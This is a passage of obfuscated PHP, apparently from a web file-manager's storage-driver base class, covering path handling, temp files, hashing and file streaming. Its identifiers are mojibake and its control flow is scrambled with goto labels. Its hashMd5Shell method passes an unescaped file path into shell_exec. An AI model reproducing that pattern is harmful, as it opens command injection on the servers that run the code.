$Fê°Åµ†¸È =& $_SERVER[µ…]; $cÄœÄæ²éí = $this->findByName($FãŠæÑÕ‹Ç[$Fê°Åµ†¸È[28]]); if ($cÄœÄæ²éí) { return !1; } $FãŠæÑÕ‹Ç[$Fê°Åµ†¸È[1470]] = 0; $FãŠæÑÕ‹Ç[$Fê°Åµ†¸È[1692]] = $this->getSort(); return parent::insert($FãŠæÑÕ‹Ç); } private function getSort() { $e”ß°öºñ´ =& $_SERVER[µ…]; $bö­ Ó‘¿¿ = parent::listData(); $D³ÉˆÏºø· = array_to_keyvalue($bö­ Ó‘¿¿, $e”ß°öºñ´[33], $e”ß°öºñ´[1692]); return empty($D³ÉˆÏºø·) ? 0 : max($D³ÉˆÏºø·) + 1; } public function update($AÂº‰“ñĞƒ, $AÕí¶™áÆÖ) { $FÑ¬éó¼Œ” =& $_SERVER[µ…]; $Fîñ’“ç—Ë = $this->listData($AÂº‰“ñĞƒ); $DŒ£ÜÅá‘ = $this->findByName($AÕí¶™áÆÖ[$FÑ¬éó¼Œ”[28]]); if (!$Fîñ’“ç—Ë || $DŒ£ÜÅá‘ && $DŒ£ÜÅá‘[$FÑ¬éó¼Œ”[388]] != $Fîñ’“ç—Ë[$FÑ¬éó¼Œ”[388]]) { return !1; } return parent::update($AÂº‰“ñĞƒ, $AÕí¶™áÆÖ); } public function remove($EóöÈê¢Î, $Dò‰ÚÊÄŒñ = false) { $D–ÑĞ°…· =& $_SERVER[µ…]; $a½Šºµ = $this->listData($EóöÈê¢Î); if (!$a½Šºµ) { return; } if (!$Dò‰ÚÊÄŒñ && $a½Šºµ[$D–ÑĞ°…·[1146]] == $D–ÑĞ°…·[86]) { return !1; } return parent::remove($EóöÈê¢Î); } public function enable($B¥®åÔöÊ§, $eßÎÏ“±ˆ¤) { return $this->update($B¥®åÔöÊ§, array($_SERVER[µ…][2074] => $eßÎÏ“±ˆ¤)); } public function run($b ëé°˜š) { return $this->update($b ëé°˜š, array($_SERVER[µ…][2084] => time())); } } goto B»“É¡À—†; CÎé¸Ş¼Î: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $E­‘‚É¥¥º =& $_SERVER[µ…]; $this->objectDriver = array($E­‘‚É¥¥º[57], $E­‘‚É¥¥º[58], $E­‘‚É¥¥º[59], $E­‘‚É¥¥º[60], $E­‘‚É¥¥º[61], $E­‘‚É¥¥º[62], $E­‘‚É¥¥º[63], $E­‘‚É¥¥º[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($e ¾£†Â¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($e ¾£†Â¶, $_SERVER[µ…][8]); } return $e ¾£†Â¶; } public function iconvApp($dŞ›è©ì±) { return $dŞ›è©ì±; } public function iconvSystem($FÛš›åïš) { return $FÛš›åïš; } public function iconvTo($EÇµ¿©ôÆ, $CÎªøÒõ, $fó‘ñî©Šì) { goto EË†åò ë¨; EË†åò ë¨: $d¤¾µöÙğ =& $_SERVER[µ…]; if (!$EÇµ¿©ôÆ || !function_exists($d¤¾µöÙğ[65])) { return $EÇµ¿©ôÆ; } static $f”Ê¿Íª = array(); goto b†’Š¾´Ò©; f‹†”µ½æë: $f”Ê¿Íª[$fó‘ñî©Šì . $d¤¾µöÙğ[66] . $CÎªøÒõ . $d¤¾µöÙğ[67] . $EÇµ¿©ôÆ] = $EÇµ¿©ôÆ; $f”Ê¿Íª[$fó‘ñî©Šì . $d¤¾µöÙğ[66] . $CÎªøÒõ . $d¤¾µöÙğ[67] . $eï½ÓòÙõ] = $EÇµ¿©ôÆ; $f”Ê¿Íª[$CÎªøÒõ . $d¤¾µöÙğ[66] . $fó‘ñî©Šì . $d¤¾µöÙğ[67] . $eï½ÓòÙõ] = $eï½ÓòÙõ; goto FİŠ‘‹¥°ò; A–›Š´öò§: $eï½ÓòÙõ = $eï½ÓòÙõ ? $eï½ÓòÙõ : $EÇµ¿©ôÆ; if (strstr($eï½ÓòÙõ, $d¤¾µöÙğ[69])) { $eï½ÓòÙõ = str_replace($d¤¾µöÙğ[69], $d¤¾µöÙğ[70], $eï½ÓòÙõ); } $f”Ê¿Íª[$CÎªøÒõ . $d¤¾µöÙğ[66] . $fó‘ñî©Šì . $d¤¾µöÙğ[67] . $EÇµ¿©ôÆ] = $eï½ÓòÙõ; goto f‹†”µ½æë; b†’Š¾´Ò©: $eÑ÷Ì„–Ø = $CÎªøÒõ . $d¤¾µöÙğ[66] . $fó‘ñî©Šì . $d¤¾µöÙğ[67] . $EÇµ¿©ôÆ; if (isset($f”Ê¿Íª[$eÑ÷Ì„–Ø])) { return $f”Ê¿Íª[$eÑ÷Ì„–Ø]; } if (function_exists($d¤¾µöÙğ[68])) { $eï½ÓòÙõ = @mb_convert_encoding($EÇµ¿©ôÆ, $fó‘ñî©Šì, $CÎªøÒõ); } else { $eï½ÓòÙõ = @iconv($CÎªøÒõ, $fó‘ñî©Šì, $EÇµ¿©ôÆ); } goto A–›Š´öò§; FİŠ‘‹¥°ò: return $eï½ÓòÙõ; goto EœÄ•ä‰á; EœÄ•ä‰á: } public function getPathInner($a–æ¢ŞÙäã) { $AÜ¥ÏÙ—›Ü = IO::init($a–æ¢ŞÙäã); return $AÜ¥ÏÙ—›Ü->path; } public function getPathOuter($B¸•‰ğ˜š) { $C¿É²ª‹£ =& $_SERVER[µ…]; $Cá´³‚ßØ¤ = strlen(trim($this->pathBase, $C¿É²ª‹£[8])); $B¸•‰ğ˜š = substr(trim($B¸•‰ğ˜š, $C¿É²ª‹£[8]), $Cá´³‚ßØ¤); return $this->pathDriver . $C¿É²ª‹£[8] . ltrim($B¸•‰ğ˜š, $C¿É²ª‹£[8]); } public function isParentOf($F¯Ú„õ¥ƒÛ, $aŠÌÕß´œ¾) { $fÂçëË°Í“ =& $_SERVER[µ…]; $F¯Ú„õ¥ƒÛ = rtrim(strtolower($F¯Ú„õ¥ƒÛ), $fÂçëË°Í“[8]) . $fÂçëË°Í“[8]; $aŠÌÕß´œ¾ = rtrim(strtolower($aŠÌÕß´œ¾), $fÂçëË°Í“[8]) . $fÂçëË°Í“[8]; $CçÎŸ³¿¤“ = strpos($aŠÌÕß´œ¾, $F¯Ú„õ¥ƒÛ) === 0; return $CçÎŸ³¿¤“; } public function getType() { $dŠè±ï™†Æ =& $_SERVER[µ…]; $aÆ×¯ë£…¸ = str_replace($dŠè±ï™†Æ[71], $dŠè±ï™†Æ[33], get_class($this)); return strtolower($aÆ×¯ë£…¸); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Eâğ•âŒŞ, $F¯Ú­Î¶¡) { $fæÄ¡·‰í™ =& $_SERVER[µ…]; $c›µ¤»Ùï = rtrim($Eâğ•âŒŞ, $fæÄ¡·‰í™[8]) . $fæÄ¡·‰í™[8] . $F¯Ú­Î¶¡; $fà …çáĞ¨ = $this->exist($c›µ¤»Ùï); return $fà …çáĞ¨ ? $c›µ¤»Ùï : !1; } public function setModifyTime($d¤ÇµöÚÅö, $FËÚ·À¢Æ = '') { } public function renameObject($dœ ‚Å§è, $D¼¼Ø–à…Ä) { goto fŸå¾æ”Æ§; a«ÅœŸ¤Âå: $dœ ‚Å§è = $this->getPathOuter($dœ ‚Å§è); $D¼¼Ø–à…Ä = $this->pathFather($dœ ‚Å§è) . $D¼¼Ø–à…Ä; if (IO::isFile($dœ ‚Å§è)) { $d¿Ò‘Ò•èÚ = IO::copy($dœ ‚Å§è, $this->pathFather($dœ ‚Å§è), REPEAT_RENAME_FOLDER, $a¯ŠïÖÀƒ¸); if ($d¿Ò‘Ò•èÚ) { IO::remove($dœ ‚Å§è); } } else { $d¿Ò‘Ò•èÚ = IO::mkdir($D¼¼Ø–à…Ä); if (!$d¿Ò‘Ò•èÚ) { return !1; } $cßµêÛ¼„ = IO::listPath($dœ ‚Å§è, !0); $FôğšĞ”­ = array_merge($cßµêÛ¼„[$bô Œ¶•Â•[73]], $cßµêÛ¼„[$bô Œ¶•Â•[74]]); foreach ($FôğšĞ”­ as $Eñ‚òöÖ›) { IO::move($Eñ‚òöÖ›[$bô Œ¶•Â•[75]], $D¼¼Ø–à…Ä, REPEAT_RENAME_FOLDER); } IO::remove($dœ ‚Å§è); } goto BÉÜé¿À†œ; BÉÜé¿À†œ: return $d¿Ò‘Ò•èÚ ? $D¼¼Ø–à…Ä : !1; goto aÚß¢‡‚Ñ¾; fŸå¾æ”Æ§: $bô Œ¶•Â• =& $_SERVER[µ…]; $a¯ŠïÖÀƒ¸ = $D¼¼Ø–à…Ä; Hook::trigger($bô Œ¶•Â•[72], $this, $dœ ‚Å§è, $this, $this->pathFather($dœ ‚Å§è) . $D¼¼Ø–à…Ä); goto a«ÅœŸ¤Âå; aÚß¢‡‚Ñ¾: } public function tempFile($d×¬ªŒÈé‘ = '', $aƒœ¬§–Ş = '') { goto aï‚ŒÀ¢Î; cïôÀ¿´²¶: return $b§‘Œ²®—ã; goto bÖ¤ß¾©¾ë; aï‚ŒÀ¢Î: if (!$d×¬ªŒÈé‘) { $d×¬ªŒÈé‘ = rand_string(15); } $Cöë˜Îİ¡ = TEMP_FILES . rand_string(15) . $_SERVER[µ…][8]; @mkdir($Cöë˜Îİ¡, 511, !0); goto cêùºÙƒÑê; cêùºÙƒÑê: $b§‘Œ²®—ã = $Cöë˜Îİ¡ . $d×¬ªŒÈé‘; @touch($b§‘Œ²®—ã); if ($aƒœ¬§–Ş) { file_put_contents($b§‘Œ²®—ã, $aƒœ¬§–Ş); } goto cïôÀ¿´²¶; bÖ¤ß¾©¾ë: } public function tempFileRemve($EŠÍÄŒÇ) { @unlink($EŠÍÄŒÇ); @rmdir($this->pathFather($EŠÍÄŒÇ)); } public function mkfile($b°Ãáß‚Ïï, $cˆ³‡°¾Ç = '', $b¢ŠÂĞôö = REPEAT_RENAME) { } public function mkdir($FÚ„‰¨”, $eğ…‹£Ê–ó = REPEAT_SKIP) { } public function delFile($F­“å÷„¬ê) { } public function delFolder($E¡°Ğˆ´·÷) { } public function copyFile($dâ”¨ê½Õº, $Bª ”»À ‰) { } public function moveFile($D‹¢®«‚ƒ, $cÖâ‚Ğë ) { } public function remove($b†Ö“ö¼òƒ) { if ($this->isFile($b†Ö“ö¼òƒ)) { return $this->delFile($b†Ö“ö¼òƒ); } return $this->delFolder($b†Ö“ö¼òƒ); } public function rename($DÔöŠô…Æ™, $C‡¯áùø×Ä) { } public function exist($FåÏåó¥Ç‡) { } public function findByHash($dôœÒĞ·¾” = '', $FîÏÌåÚ = '') { return !1; } public function isFile($F¤ŠÃå’Œô) { } public function isFolder($aŞÄµĞ½Ãİ) { } public function size($c¬­Â‚‹¡ƒ) { } public function info($A´­£ºË‹À) { } public function infoSimple($F¸ÑŒ©®çµ) { return $this->info($F¸ÑŒ©®çµ); } public function infoAuth($eï±¤òµñØ) { return $this->info($eï±¤òµñØ); } public function infoFull($EœÂÂğÍ) { return $this->info($EœÂÂğÍ); } public function infoWithChildren($A¯±‚¨ß¬ƒ) { $cêëÊ¢À =& $_SERVER[µ…]; static $E„æ‚›¥¨¾ = array(); if (isset($E„æ‚›¥¨¾[$A¯±‚¨ß¬ƒ])) { return $E„æ‚›¥¨¾[$A¯±‚¨ß¬ƒ]; } $Fì‰ŸÓß­“ = $this->info($A¯±‚¨ß¬ƒ); if ($Fì‰ŸÓß­“ && $Fì‰ŸÓß­“[$cêëÊ¢À[29]] == $cêëÊ¢À[76]) { $f”‰ö…ÊÕÍ = array($cêëÊ¢À[77] => 0, $cêëÊ¢À[78] => 0, $cêëÊ¢À[79] => 0); $this->infoChildren($A¯±‚¨ß¬ƒ, $f”‰ö…ÊÕÍ); $Fì‰ŸÓß­“[$cêëÊ¢À[77]] = $f”‰ö…ÊÕÍ[$cêëÊ¢À[77]]; $Fì‰ŸÓß­“[$cêëÊ¢À[80]] = array($cêëÊ¢À[81] => $f”‰ö…ÊÕÍ[$cêëÊ¢À[78]], $cêëÊ¢À[82] => $f”‰ö…ÊÕÍ[$cêëÊ¢À[79]]); $E„æ‚›¥¨¾[$A¯±‚¨ß¬ƒ] = $Fì‰ŸÓß­“; } return $Fì‰ŸÓß­“; } public function listPath($aÏÅ­¥‚ï®, $b›ñ¹¶Ùê¹ = false) { } public function has($c‘¥’£ª™š, $Aè†¦óâ’£ = false, $FÎª„Ãä±¶ = false) { } public function canRead($eá¥Ñ’âŸ) { } public function canWrite($Aç¥ Œ‹Ç‰) { } public function getContent($A–«®’Ó„) { } public function setContent($Aºî…‘´†¹, $cèàÈÒÊâ = '') { } protected function infoChildren($A„È ëëº , &$eäÏïè¬ó) { $d‹Ï¹‡ïÏ£ =& $_SERVER[µ…]; check_abort_echo(); $dù¾áĞèÏ = $this->listPath($A„È ëëº , !0); $dù¾áĞèÏ = array_merge($dù¾áĞèÏ[$d‹Ï¹‡ïÏ£[74]], $dù¾áĞèÏ[$d‹Ï¹‡ïÏ£[73]]); foreach ($dù¾áĞèÏ as $b¥Ÿ £ÛÓ) { if ($b¥Ÿ £ÛÓ[$d‹Ï¹‡ïÏ£[29]] == $d‹Ï¹‡ïÏ£[76]) { $eäÏïè¬ó[$d‹Ï¹‡ïÏ£[79]]++; $AïÆŒŞÈ£Ê = $this->getPathInner($b¥Ÿ £ÛÓ[$d‹Ï¹‡ïÏ£[75]]); $this->infoChildren($AïÆŒŞÈ£Ê, $eäÏïè¬ó); } else { $eäÏïè¬ó[$d‹Ï¹‡ïÏ£[78]]++; $eäÏïè¬ó[$d‹Ï¹‡ïÏ£[77]] += $b¥Ÿ £ÛÓ[$d‹Ï¹‡ïÏ£[77]]; } } } public function fileSubstr($a¼¿Š‚, $bÊ—ÎÎÊå, $dáŒ‘Òó–Ì) { } public function listAll($fŸ›½²¨) { } public function listAllMake($d»õôñ¹•Ş, &$b‰¯’‚Õˆó) { $AéÄš†Ï¤À =& $_SERVER[µ…]; check_abort_echo(); $Aã†“É‚÷å = $this->listPath($d»õôñ¹•Ş, !0); if (!$Aã†“É‚÷å) { return; } $cÅ“£‡±¢à = array_merge($Aã†“É‚÷å[$AéÄš†Ï¤À[74]], $Aã†“É‚÷å[$AéÄš†Ï¤À[73]]); foreach ($cÅ“£‡±¢à as $c¨Ûª¹´Û‚) { goto B©ç·æ±æƒ; B©ç·æ±æƒ: $D£ÆÅ‰ŸêŞ = $c¨Ûª¹´Û‚[$AéÄš†Ï¤À[29]] == $AéÄš†Ï¤À[76]; $F»ƒå‚Ñ¥² = array($AéÄš†Ï¤À[75] => $c¨Ûª¹´Û‚[$AéÄš†Ï¤À[75]], $AéÄš†Ï¤À[76] => $D£ÆÅ‰ŸêŞ); if (isset($c¨Ûª¹´Û‚[$AéÄš†Ï¤À[77]])) { $F»ƒå‚Ñ¥²[$AéÄš†Ï¤À[77]] = $c¨Ûª¹´Û‚[$AéÄš†Ï¤À[77]]; } goto dœ»±½†ˆÅ; dœ»±½†ˆÅ: if (isset($c¨Ûª¹´Û‚[$AéÄš†Ï¤À[83]])) { $F»ƒå‚Ñ¥²[$AéÄš†Ï¤À[83]] = $c¨Ûª¹´Û‚[$AéÄš†Ï¤À[83]]; } if (!$D£ÆÅ‰ŸêŞ) { $b‰¯’‚Õˆó[] = $F»ƒå‚Ñ¥²; continue; } $b‰¯’‚Õˆó[] = $F»ƒå‚Ñ¥²; goto Bê¬¡£»Ğã; Bê¬¡£»Ğã: $this->listAllMake($c¨Ûª¹´Û‚[$AéÄš†Ï¤À[75]], $b‰¯’‚Õˆó); goto E¿óÙÖ™«£; E¿óÙÖ™«£: } } public function listAllSimple($D†ÄõºÂâç) { $eÚÆ†ˆÆ„ =& $_SERVER[µ…]; $aïÕ©­†‘¿ = array(); $c±ÛŸ•Ë = $this->listAll($D†ÄõºÂâç); $fğ©‰°‘¤‰ = $this->getPathOuter($D†ÄõºÂâç); foreach ($c±ÛŸ•Ë as $E”‚šªÃ¬½) { goto eì‚Õ‹›«Â; fÎ”Ã¯˜ƒ: if (!$E”‚šªÃ¬½[$eÚÆ†ˆÆ„[76]]) { $fËÅõÚ¡ãŒ[$eÚÆ†ˆÆ„[85]] = $BæšİßÏÏ˜; } $aïÕ©­†‘¿[] = $fËÅõÚ¡ãŒ; goto Aù†”ÊÑãó; e‘°“ŠÑç: $fËÅõÚ¡ãŒ = array($eÚÆ†ˆÆ„[75] => $C–“ôÁÂ„¥, $eÚÆ†ˆÆ„[76] => $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[76]]); if (isset($E”‚šªÃ¬½[$eÚÆ†ˆÆ„[77]]) && !$E”‚šªÃ¬½[$eÚÆ†ˆÆ„[76]]) { $fËÅõÚ¡ãŒ[$eÚÆ†ˆÆ„[77]] = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[77]]; } if (isset($E”‚šªÃ¬½[$eÚÆ†ˆÆ„[83]])) { $fËÅõÚ¡ãŒ[$eÚÆ†ˆÆ„[83]] = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[83]]; } goto fÎ”Ã¯˜ƒ; eì‚Õ‹›«Â: $BæšİßÏÏ˜ = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[75]]; $C–“ôÁÂ„¥ = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[75]]; if (isset($E”‚šªÃ¬½[$eÚÆ†ˆÆ„[84]])) { $BæšİßÏÏ˜ = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[84]][$eÚÆ†ˆÆ„[75]]; $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[77]] = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[84]][$eÚÆ†ˆÆ„[77]]; $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[83]] = $E”‚šªÃ¬½[$eÚÆ†ˆÆ„[84]][$eÚÆ†ˆÆ„[83]]; } else { $C–“ôÁÂ„¥ = substr($E”‚šªÃ¬½[$eÚÆ†ˆÆ„[75]], strlen(get_path_father($fğ©‰°‘¤‰))); $C–“ôÁÂ„¥ = $eÚÆ†ˆÆ„[8] . ltrim($C–“ôÁÂ„¥, $eÚÆ†ˆÆ„[8]); } goto e‘°“ŠÑç; Aù†”ÊÑãó: } return $aïÕ©­†‘¿; } public function upload($a…µóÆµ±è, $c¬¹›´÷¾, $EºÊçÓÖ¯Ù = false, $e÷¤à®ÅØ¨ = REPEAT_REPLACE) { } public function uploadFileByID($BğºÇÇáëÌ, $D“İ¦İ­æÛ, $céÙà£’à‰) { } public function uploadFileByPath($F®¨½öªøÊ, $DŸÛˆæ‡¢ä, $F‚–ö‹ß¡ì = array()) { } public function isUploadServer() { $f¿“ãùè´ =& $_SERVER[µ…]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $f¿“ãùè´[86]) { return !0; } return $GLOBALS[$f¿“ãùè´[6]][$f¿“ãùè´[87]][$f¿“ãùè´[88]]; } public function isFileOutServer() { $dÊÎîŞ®ñÍ =& $_SERVER[µ…]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dÊÎîŞ®ñÍ[86]) { return !0; } return $GLOBALS[$dÊÎîŞ®ñÍ[6]][$dÊÎîŞ®ñÍ[87]][$dÊÎîŞ®ñÍ[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cƒí‚ºçÁ) { $cœà¢æß¹ô =& $_SERVER[µ…]; if (!$this->isCdnHost()) { return $cƒí‚ºçÁ; } return str_replace(trim(get_url_root($cƒí‚ºçÁ), $cœà¢æß¹ô[8]), trim($this->cdnHost, $cœà¢æß¹ô[8]), $cƒí‚ºçÁ); } public function uploadLink($Dƒ‹÷Í¸‡, $a¦˜½•Á¦ = 0) { goto A‰Ó°ÒÉ; A‰Ó°ÒÉ: $cÏæï ¹Íà =& $_SERVER[µ…]; if ($this->isUploadServer()) { return; } $fÈ•öéÙòù = $this->getType(); goto fáŠùæ¬¯; fáŠùæ¬¯: if (!in_array($fÈ•öéÙòù, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eÔÌÖÃ¸® = 1024 * 1024 * 10; goto A‡ªœ¶ÂÕ“; Fˆ™ã×ã–»: if ($C¥ÇÉä£¤Í) { $C¥ÇÉä£¤Í[$cÏæï ¹Íà[92]] = $Dƒ‹÷Í¸‡; $C¥ÇÉä£¤Í[$cÏæï ¹Íà[93]] = $fÈ•öéÙòù; } return $C¥ÇÉä£¤Í; goto A×Ô«Á­•‘; A‡ªœ¶ÂÕ“: $cñ›Òëèà = $a¦˜½•Á¦ <= $eÔÌÖÃ¸® ? $cÏæï ¹Íà[90] : $cÏæï ¹Íà[91]; $döèµ²¸öå = (!$a¦˜½•Á¦ ? 1 : ceil($a¦˜½•Á¦ / pow(1024, 3))) * 3600 * 4; $C¥ÇÉä£¤Í = $this->{$cñ›Òëèà}($Dƒ‹÷Í¸‡, $döèµ²¸öå); goto Fˆ™ã×ã–»; A×Ô«Á­•‘: } public function uploadFormData($d„ÔßõŠˆ«, $A—É«Ãâ‚ï = 3600) { } public function multiUploadFormData($Aíô•ñ³…, $Cº¡‡­ğˆ = 3600) { } public function download($cÁ©†Šö§é, $Dî˜ƒ‡¿×æ) { } public function ext($c·œ†¿à‹ß) { $bª…ÂÎ³¹ =& $_SERVER[µ…]; if (strpos($c·œ†¿à‹ß, $bª…ÂÎ³¹[8]) === -1) { $fÀõùÈ“‡ä = $c·œ†¿à‹ß; } else { $fÀõùÈ“‡ä = $this->pathThis($c·œ†¿à‹ß); } $F¦ÔÌì‰¶¦ = $bª…ÂÎ³¹[33]; if (strstr($fÀõùÈ“‡ä, $bª…ÂÎ³¹[94])) { $F¦ÔÌì‰¶¦ = substr($fÀõùÈ“‡ä, strrpos($fÀõùÈ“‡ä, $bª…ÂÎ³¹[94]) + 1); $F¦ÔÌì‰¶¦ = strtolower($F¦ÔÌì‰¶¦); } if (strlen($F¦ÔÌì‰¶¦) > 3 && preg_match($bª…ÂÎ³¹[95], $F¦ÔÌì‰¶¦, $cÊ¦°»Šç)) { $F¦ÔÌì‰¶¦ = $bª…ÂÎ³¹[33]; } return $F¦ÔÌì‰¶¦; } public function pathThis($a™Ÿ¬™Ë…) { $b¥²í‘ê =& $_SERVER[µ…]; $a™Ÿ¬™Ë… = str_replace($b¥²í‘ê[96], $b¥²í‘ê[8], rtrim($a™Ÿ¬™Ë…, $b¥²í‘ê[8])); $AĞ¹§æÒóç = strrpos($a™Ÿ¬™Ë…, $b¥²í‘ê[8]); if ($AĞ¹§æÒóç === !1) { return $a™Ÿ¬™Ë…; } return substr($a™Ÿ¬™Ë…, $AĞ¹§æÒóç + 1); } public function pathFather($cÎïë¹Ó§±) { $b³£×¯ÈÓ =& $_SERVER[µ…]; $cÎïë¹Ó§± = str_replace($b³£×¯ÈÓ[96], $b³£×¯ÈÓ[8], rtrim($cÎïë¹Ó§±, $b³£×¯ÈÓ[8])); $b¾¤—Ë›…ê = strrpos($cÎïë¹Ó§±, $b³£×¯ÈÓ[8]); if ($b¾¤—Ë›…ê === !1) { return $b³£×¯ÈÓ[33]; } return substr($cÎïë¹Ó§±, 0, $b¾¤—Ë›…ê + 1); } public function hashSimple($f¢Í¶Éïäì) { goto Eê·Ü×’êÓ; eÄøÈØÆ©ã: $Dî²‘Ñ—… = 200; $aî“ÀéÖæí = 50; if ($d¶Åà’¢³Æ <= $Dî²‘Ñ—… * $aî“ÀéÖæí) { return $this->hashMd5($f¢Í¶Éïäì) . $d¶Åà’¢³Æ; } goto bÈÄäóÔ; Eê·Ü×’êÓ: $d‹ğÙãÎïµ =& $_SERVER[µ…]; if (!$f¢Í¶Éïäì) { return md5($d‹ğÙãÎïµ[33]); } $d¶Åà’¢³Æ = $this->size($f¢Í¶Éïäì); goto eÄøÈØÆ©ã; FË‘Å¸Ûãæ: $f×¨Ó›èÌ‡ .= $this->fileSubstr($f¢Í¶Éïäì, $d¶Åà’¢³Æ - $Dî²‘Ñ—…, $Dî²‘Ñ—…); return md5($f×¨Ó›èÌ‡) . $d¶Åà’¢³Æ; goto F¯‹Ê¥­‡È; bÈÄäóÔ: $Dùğ¿©ÀÖç = intval($d¶Åà’¢³Æ / $aî“ÀéÖæí); $f×¨Ó›èÌ‡ = $d‹ğÙãÎïµ[33]; for ($eƒÒóÚº = 0; $eƒÒóÚº < $aî“ÀéÖæí; $eƒÒóÚº++) { $f×¨Ó›èÌ‡ .= $this->fileSubstr($f¢Í¶Éïäì, $Dùğ¿©ÀÖç * $eƒÒóÚº, $Dî²‘Ñ—…); } goto FË‘Å¸Ûãæ; F¯‹Ê¥­‡È: } public static $md5Cache = array(); public function hashMd5($d¾˜®›æÇ¢) { $d¾˜®›æÇ¢ = $this->iconvSystem($d¾˜®›æÇ¢); if (isset(self::$md5Cache[$d¾˜®›æÇ¢])) { return self::$md5Cache[$d¾˜®›æÇ¢]; } self::$md5Cache[$d¾˜®›æÇ¢] = $this->hashMd5Shell($d¾˜®›æÇ¢); if (!self::$md5Cache[$d¾˜®›æÇ¢]) { self::$md5Cache[$d¾˜®›æÇ¢] = @md5_file($d¾˜®›æÇ¢); } return self::$md5Cache[$d¾˜®›æÇ¢]; } private function hashMd5Shell($AÔŞÊÄ¸±Â) { goto Fº½¦÷ğå; eƒ¤§Ší—…: $CİÊÚ˜Ê„ = shell_exec($bÆƒ«“£Ù‹ . "\x20\42{$AÔŞÊÄ¸±Â}\x22"); $CİÊÚ˜Ê„ = str_replace($bÛÒµ¶éã[103], $bÛÒµ¶éã[33], $CİÊÚ˜Ê„); return substr($CİÊÚ˜Ê„, 0, 32); goto eƒğ˜ Ä‘; EùÍ°ƒìˆˆ: $bÆƒ«“£Ù‹ = Cache::get($bÛÒµ¶éã[100]); if (!$bÆƒ«“£Ù‹) { $E‘İº‘Öò³ = BASIC_PATH . $bÛÒµ¶éã[101]; $aˆ ¿â¾‰ = md5_file($E‘İº‘Öò³); $bÆƒ«“£Ù‹ = $bÛÒµ¶éã[102]; foreach ($Cáƒİ÷…æ as $D–¯É†İ«) { $CİÊÚ˜Ê„ = shell_exec($D–¯É†İ« . "\40\42{$E‘İº‘Öò³}\42"); if ($CİÊÚ˜Ê„ && substr(trim($CİÊÚ˜Ê„), 0, 32) == $aˆ ¿â¾‰) { $bÆƒ«“£Ù‹ = $D–¯É†İ«; break; } } Cache::set($bÛÒµ¶éã[100], $bÆƒ«“£Ù‹, 3600); } if ($bÆƒ«“£Ù‹ == $bÛÒµ¶éã[102]) { return !1; } goto eƒ¤§Ší—…; Fº½¦÷ğå: $bÛÒµ¶éã =& $_SERVER[µ…]; if (!function_exists($bÛÒµ¶éã[97])) { return !1; } $Cáƒİ÷…æ = array($bÛÒµ¶éã[98], $bÛÒµ¶éã[99]); goto EùÍ°ƒìˆˆ; eƒğ˜ Ä‘: } public function link($FòíêÕÚ†) { return $FòíêÕÚ†; } public function fileOut($b‘¶ÉÈˆ×½, $d¦©©µÎˆ = false, $dƒÊƒ…Î‰É = false, $f¦õé¤¤— = '') { goto DÔ……¿®¡ß; b“îÇ†÷¸: if ($f™¯ë‚é«) { $bÀ¹²‡àÊ¢ = intval(1000 * 1000 * ($eßÊ„ë—¶§ / $f™¯ë‚é«)); } while ($BÂˆ²Âæ <= $dî¡ïœóÖ…) { $fÙ…‰ÜÉ¸ = timeFloat(); check_abort(); $CÎÜáğ¬ = $dî¡ïœóÖ… - $BÂˆ²Âæ + 1; if ($CÎÜáğ¬ <= $eßÊ„ë—¶§) { $eßÊ„ë—¶§ = $CÎÜáğ¬; } echo $this->fileSubstr($b‘¶ÉÈˆ×½, $BÂˆ²Âæ, $eßÊ„ë—¶§); $BÂˆ²Âæ += $eßÊ„ë—¶§; if ($eßÊ„ë—¶§ == $CÎÜáğ¬) { $BÂˆ²Âæ = $dî¡ïœóÖ… + 1; } if ($bÀ¹²‡àÊ¢) { $aÏ»Ø¯†¸Ó = intval(1000 * 1000 * (timeFloat() - $fÙ…‰ÜÉ¸)); $B’˜ñ–İ…§ = $bÀ¹²‡àÊ¢ - $aÏ»Ø¯†¸Ó; if ($B’˜ñ–İ…§ > 5) { usleep($B’˜ñ–İ…§); } } } goto C¿à—ğ–õ˜; b†‹¨ï¹ˆŞ: $dÕ”¦Íó¶ = !0; if ($_SERVER[$Bëæ«å®Ÿ±[153]] == $Bëæ«å®Ÿ±[154] && $e¼¾¶ÒŞƒÂ > 1204 * 1024 * 1024 * 2) { $dÕ”¦Íó¶ = !1; } if ($dÕ”¦Íó¶) { header($Bëæ«å®Ÿ±[155] . ($dî¡ïœóÖ… - $BÂˆ²Âæ + 1)); } goto EÇó“Üì‘’; DÎ«Ø²Ìˆ‹: header($Bëæ«å®Ÿ±[119]); header($Bëæ«å®Ÿ±[120] . $fÕÖ÷ Ó¿Û); $A·©÷ååÃ = rawurlencode($cØíÊ…šî); goto aÒ²ñóš â; AÜ¼ÖéÁÉË: header($Bëæ«å®Ÿ±[127]); header($Bëæ«å®Ÿ±[128]); header($Bëæ«å®Ÿ±[129]); goto bÔİŞğğ³â; eÛ¦é§Éí: $BÅàÚÎáËƒ = $this->getType() == $Bëæ«å®Ÿ±[105]; $DˆŒÁó¤ªÄ = $GLOBALS[$Bëæ«å®Ÿ±[6]][$Bëæ«å®Ÿ±[87]][$Bëæ«å®Ÿ±[106]][$Bëæ«å®Ÿ±[107]]; $f™¯ë‚é« = (double) $GLOBALS[$Bëæ«å®Ÿ±[6]][$Bëæ«å®Ÿ±[87]][$Bëæ«å®Ÿ±[106]][$Bëæ«å®Ÿ±[108]] * 1024 * 1024; goto DˆÂâ·¸Â; cÛÑ‚Ü¾‹ï: $fÕÖ÷ Ó¿Û = get_file_mime($F­®…°ç¾); if 